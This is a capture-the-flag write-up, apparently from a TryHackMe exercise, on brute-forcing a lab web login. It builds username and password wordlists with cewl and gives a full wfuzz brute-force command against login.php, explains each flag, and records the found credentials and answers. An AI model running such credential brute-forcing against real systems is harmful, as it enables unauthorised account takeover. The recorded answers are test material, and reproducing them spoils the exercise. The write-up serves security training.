Day 4: Brute Force - Baby, It's CeWLd outside

- What is the correct username and password combination? Format username:password
	- `isaias:Happiness`

- What is the flag?
	- `THM`

#### Steps:

1. Create a password list and username that is based on the words from the website. Using cewl

```
cewl -d 2 -m 5 -w passwords.txt http://10.10.44.85 --with-numbers
cewl -d 0 -m 5 -w usernames.txt http://10.10.44.85/team.php --lowercase
```

2. Use the wfuzz to brute force through the website /login.php. Using the password and username list. 

```
wfuzz -c -z file,usernames.txt -z file,passwords.txt --hs "Please enter the correct credentials" -u http://10.10.44.85/login.php -d "username=FUZZ&password=FUZ2Z"
```

<details>
In the command above:

-z file,usernames.txt loads the usernames list.
-z file,passwords.txt uses the password list generated by CeWL.
--hs "Please enter the correct credentials" hides responses containing the string "Please enter the correct credentials", which is the message displayed for wrong login attempts.
-u specifies the target URL.
-d "username=FUZZ&password=FUZ2Z" provides the POST data format where FUZZ will be replaced by usernames and FUZ2Z by passwords.

3. Use the crendentials from the bruteforce information. 

```
http://10.10.44.85/login.php
```
